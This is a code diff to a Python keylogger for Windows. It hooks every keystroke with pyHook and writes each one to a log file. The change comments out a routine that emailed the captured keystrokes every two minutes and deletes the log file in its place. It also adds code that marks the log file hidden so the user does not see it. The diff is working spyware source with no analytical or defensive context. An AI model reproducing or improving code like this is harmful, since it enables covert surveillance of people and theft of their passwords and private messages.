@@ -39,22 +39,27 @@ def OnKeyboardEvent(event):
 		else:
 			f = open(file_log,'r+')
 			save = f.read()
+			f.close()
 			n = datetime.now()
 			global j2
 			if n.minute % 2 == 0 and j2!= n.minute:
 				j2 = n.minute
-				sendmail(save)
-				f.write('')
-			f.close()
+#				sendmail(save)
+				os.remove(file_log)
 			k=chr(event.Ascii)
 			if event.Ascii==13:
 				k='\n'    
 			if event.Ascii==32:
 				k='  '
 			save += k
-			f = open(file_log,'r+')
-			f.write(save)
-			f.close()
+			try:
+				f = open(file_log,'r+')
+				f.write(save)
+				f.close()
+			except:
+				f = open(file_log,'w')
+				f.close()
+				win32api.SetFileAttributes(file_log,win32con.FILE_ATTRIBUTE_HIDDEN)
 	return True
 hm = pyHook.HookManager()
 hm.KeyDown = OnKeyboardEvent
